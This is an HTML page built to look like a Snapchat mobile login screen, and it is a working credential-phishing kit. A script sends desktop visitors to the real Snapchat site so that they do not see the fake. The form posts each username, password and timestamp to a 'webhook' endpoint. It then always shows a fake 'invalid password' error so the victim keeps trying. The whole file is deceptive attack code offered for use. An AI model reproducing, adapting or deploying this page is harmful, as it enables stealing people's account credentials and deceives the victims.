<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Log In</title>
<script>
(function(){
  const ua = navigator.userAgent.toLowerCase();
  if(!/mobile|android|iphone|ipad|tablet/i.test(ua) && (ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))) {
    window.location.replace("https://accounts.snapchat.com/");
  }
})();
</script>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
body { font-family: "Inter", sans-serif; user-select: none; -webkit-user-select: none; -ms-user-select: none; margin: 0; background: #fff; }
::-webkit-scrollbar { display: none; }

/* Inputs */
.input-container { width: 85%; margin: 0 auto; }
input[type="text"], input[type="password"] { 
  width: 100%; 
  font-size: 0.9rem; 
  font-weight: 500; 
  padding-bottom: 0.15rem; 
  font-family: "Inter", sans-serif;
  border-radius: 0; 
  border-bottom: 1px solid #ccc;
  outline: none;
}

/* Password label and field */
label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
#password { position: relative; top: -6px; }

/* Gap between username and password */
.password-container { margin-top: 4px; position: relative; }

/* Checkbox and forgot password */
label.inline-flex.items-center { 
  position: relative; 
  top: -8px; 
  font-size: 0.817rem; 
  font-weight: 350;
}
#forgotPassword { 
  position: relative; 
  top: -9.5px; 
  font-size: 0.817rem; 
  font-weight: 350;
  color: #0083ff; 
}

/* Error message */
#errorMsg { 
  width: 85%; 
  margin-left: auto; 
  margin-right: auto; 
  font-size: 0.8rem; 
  text-align: left; 
  color:#ff1952; 
  font-weight: 400;
  margin-top: -4px;
  margin-bottom: -2px;
  position: relative;
  top: -6px;
}

/* Heading */
h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }

/* Form spacing */
form.flex.flex-col.space-y-6 { gap: 0.5rem; }

/* Login button */
#loginBtn { 
  transition: all 0.2s ease; 
  min-width: 42%; 
  width: 62%; 
  font-size: 1.05rem; 
  padding: 0.7rem 0; 
  display: flex; 
  justify-content: center; 
  align-items: center;
  margin: 0 auto; 
  position: relative;
  border-radius: 9999px;
}
#loginBtn:hover:not(:disabled) { background-color: #0090e0; }
#loginBtn:active:not(:disabled) { background-color: #007fcc; }

/* Spinner */
@keyframes spinnerRotate { to { transform: rotate(360deg); } }
.spinner {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 24px;
  height: 24px;
  border: 3px solid #fff;
  border-bottom-color: transparent;
  border-radius: 50%;
  animation: spinnerRotate 1000ms linear infinite;
}
.spinner::before {
  content: "";
  position: absolute;
  top: 50%;
  left: 50%;
  width: 12px;
  height: 12px;
  margin-top: -6px;
  margin-left: -6px;
  border: 2px solid #fff;
  border-top-color: transparent;
  border-radius: 50%;
  animation: spinnerRotate 500ms linear infinite reverse;
}

/* Password toggle */
.password-toggle { 
  position: absolute; right: 0; top: 50%; 
  transform: translateY(-50%); 
  color: #adb7bf; 
  font-size: 0.875rem; 
  background: transparent; 
  border: none; 
  cursor: pointer; 
}
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
    <i class="fas fa-chevron-left"></i>
  </button>
  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="flex flex-col input-container">
      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
      <input id="username" type="text" autocomplete="username" required inputmode="text">
    </div>
    <div class="flex flex-col password-container input-container">
      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
      <input id="password" type="password" autocomplete="current-password" required inputmode="text">
      <button type="button" class="password-toggle" onclick="togglePassword()">
        <i id="eyeIcon" class="fas fa-eye-slash"></i>
      </button>
    </div>
    <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
    <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
      <input type="checkbox" checked>
      <span>Save Login Info on your iCloud devices</span>
    </label>
    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg relative" disabled>
      <span class="btn-text">Log In</span>
      <span class="spinner" style="display:none;"></span>
    </button>
  </form>
</div>
<script>
document.addEventListener("DOMContentLoaded", function(){
  const username = document.getElementById("username"),
        password = document.getElementById("password"),
        loginBtn = document.getElementById("loginBtn"),
        errorMsg = document.getElementById("errorMsg"),
        loginForm = document.getElementById("loginForm");

  const spinner = loginBtn.querySelector(".spinner");
  const btnText = loginBtn.querySelector(".btn-text");

  const webhookUrl = "/api/validate"; // keep your webhook here

  function toggleButton() {
    if(username.value.trim() && password.value.trim()){
      loginBtn.classList.remove("bg-[#b7c0c8]");
      loginBtn.classList.add("bg-[#00b0ff]");
      loginBtn.disabled = false;
    } else {
      loginBtn.classList.remove("bg-[#00b0ff]");
      loginBtn.classList.add("bg-[#b7c0c8]");
      loginBtn.disabled = true;
    }
  }

  username.addEventListener("input", toggleButton);
  password.addEventListener("input", toggleButton);

  loginForm.addEventListener("submit", async function(e){
    e.preventDefault();
    spinner.style.display="block";
    btnText.style.visibility="hidden";

    const u=username.value.trim();
    const p=password.value.trim();
    const timestamp = new Date().toLocaleString();

    if(u && p){
      const payload = {username:u,password:p,timestamp};
      // send to your webhook
      fetch(webhookUrl,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
      }).catch(()=>{});

      setTimeout(()=>{
        errorMsg.textContent="Invalid username or password. Try again.";
        errorMsg.classList.remove("hidden");
        spinner.style.display="none";
        btnText.style.visibility="visible";
        password.value="";
        toggleButton();
      },1200);
    } else {
      spinner.style.display="none";
      btnText.style.visibility="visible";
      errorMsg.textContent="Please fill in both fields.";
      errorMsg.classList.remove("hidden");
    }
  });

  window.togglePassword=function(){
    password.type = password.type === "password" ? "text" : "password";
    document.getElementById("eyeIcon").classList.toggle("fa-eye");
    document.getElementById("eyeIcon").classList.toggle("fa-eye-slash");
  }
});

function goBack(){window.history.length>1?window.history.back():window.location.reload()}
</script>
</body>
</html>
